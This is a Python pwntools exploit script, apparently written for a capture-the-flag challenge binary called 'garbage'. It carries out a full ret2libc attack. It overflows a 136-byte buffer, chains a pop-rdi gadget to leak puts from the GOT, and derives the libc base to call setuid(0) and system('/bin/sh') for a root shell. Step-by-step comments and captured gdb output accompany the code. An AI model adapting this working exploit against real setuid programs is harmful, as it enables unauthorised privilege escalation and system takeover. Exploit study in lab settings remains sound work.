#!/usr/bin/python3
# -*- coding: utf-8 -*-
from pwn import *

# If the exploit is executed locally use the terminal configuration and gdb.debug
io = gdb.debug(['./garbage'], 'break main')
# io = process('./garbage')

# If the exploit is executed remotelly use ssh
# s = ssh(host = 'IP', user = 'username', password = 'password')
# io = s.process('/path/to/the/binary')

context(os='linux', arch='amd64')
context.log_level = 'DEBUG'

# Offset to %rsp is 136. encode() converts the string into bytes.
junk = ("A" * 136).encode()
# ROP_TOOL or ropper --search 'pop r?i'
# The instrucction we have decided to execute: 0x000000000040179b: pop rdi; ret;
pop_rdi = p64(0x40179b)
# objdump -D ./garbage | grep puts
# Location of PUTS in the Global Offset Table (GOT) GLIBC # 404028 <puts@GLIBC_2.2.5>
got_puts = p64(0x404028)
# objdump -D ./garbage | grep puts
# Location of PUTS in the Procedure Linkage Table (PLT): 0000000000401050 <puts@plt>:
plt_puts = p64(0x401050)
# # objdump -D ./garbage | grep main
# Location of MAIN in the Procedure Linkage Table (PLT): 0000000000401619 <main>:
plt_main = p64(0x401619)
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
# 426: 0000000000074040   429 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5 
libc_puts = p64(0x74040)
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
# 1421: 0000000000046ff0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
libc_system = p64(0x46ff0)
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep 'setuid'
# 25: 00000000000c8920   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5
libc_setuid = p64(0xc8920)
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep 'bin/sh'
# 183cee /bin/sh
libc_binsh = p64(0x183cee)

# The first part of the exploit would leak a real address, that we can use as a point of reference. 
# gadget_leak = pop_rdi + got_puts + plt_puts
# 1. The first 136 junk characters will overwrite till we reach the position in memory of the stack pointer %rsp.  
# 	%rsp is the stack pointer, which points to the top of the current stack frame. 
# 2. We overwrite the stack pointer %rsp with the memory location 0x40179b, which has the instructions "pop rdi; ret;"
# 3. “pop rdi;” is going to take the first value of the stack and put it into the register %rdi.
#	Popping means restoring whatever is on top of the stack into a register. 
# 	In other words, we can put an "argument" into the register %rdi, and that is the address to Global Offset Table (GOT) GLIBC # 404028 <puts@GLIBC_2.2.5>.
# 4. "ret;" transfers program control to a return address located on %rsp.  
#	The return is going to be the address of %rsp, but now with the Procedure Linkage Table (PLT): 0000000000401050 <puts@plt>.
# 	int puts(const char *str) writes a string to stdout up to but not including the null character. A newline character is appended to the output.
# 5. %rsp point now to 0x401050 <puts@plt>, puts uses %rdi (the first register) as an argument, executes itself with this argument, leaks the global location of <puts@GLIBC_2.2.5> and crashes.
# 	In other words, the "Local" PUT (0x404028) is going to take the argument in %rdi (<puts@GLIBC_2.2.5>) and leak this information.
# 6. We do not want the exploit to crush because the ASLR makes the address of libc change. 
gadget_leak = pop_rdi + got_puts + plt_puts + plt_main

io.sendline(junk + gadget_leak)
# io.sendline('N3veRF3@r1iSh3r3!')
io.recvuntil('access denied.')

# We leaked the address of PUTS within LIBC <puts@GLIBC_2.2.5>
leaked_put = io.recv()[:8].strip().ljust(8, b'\x00')
log.info(f'Leaked Address: {leaked_put.hex()}')

# The offset between put@leaked and put@glibc 
offset = u64(leaked_put) - u64(libc_puts)
log.info(f'Offset: {offset}')

# Little endian for the exploit
system_loc = (u64(libc_system) + offset).to_bytes(8, byteorder='little')
setuid_loc = (u64(libc_setuid) + offset).to_bytes(8, byteorder='little')
binsh_loc = (u64(libc_binsh) + offset).to_bytes(8, byteorder='little')
'''
# Big endian for the test in GDB, so we do not need to turn around the addresses.
system_loc = (u64(libc_system) + offset).to_bytes(8, byteorder='big')
setuid_loc = (u64(libc_setuid) + offset).to_bytes(8, byteorder='big')
binsh_loc = (u64(libc_binsh) + offset).to_bytes(8, byteorder='big')
'''
log.info(f'System : {system_loc.hex()}')
log.info(f'setuid : {setuid_loc.hex()}')
log.info(f'/bin/sh : {binsh_loc.hex()}')

# Gadget to Code Exec 
gadget_rce = pop_rdi + p64(0) + setuid_loc
gadget_rce += pop_rdi + binsh_loc + system_loc

io.sendline(junk + gadget_rce)
io.interactive()

'''
# python3 exploit.py 
[+] Starting local process '/usr/bin/gdbserver': pid 2474
[*] running in new terminal: /usr/bin/gdb -q  "./garbage" -x "/tmp/pwnop36ngoa.gdb"
[*] Leaked Address: 4010072c0e7f0000
[*] Offsset: 139698844454912
[*] System : 00007f0e2c043ff0
[*] setuid : 00007f0e2c0c5920
[*] /bin/sh : 00007f0e2c180cee

gef➤  x/x 0x00007f0e2c043ff0
0x7f0e2c043ff0 <__libc_system>:	0x74ff8548
gef➤  x/x 0x00007f0e2c0c5920
0x7f0e2c0c5920 <__setuid>:	0x38ec8348
gef➤  x/x 0x00007f0e2c180cee
0x7f0e2c180cee:	0x6e69622f
gef➤  x/s 0x00007f0e2c180cee
0x7f0e2c180cee:	"/bin/sh"
'''
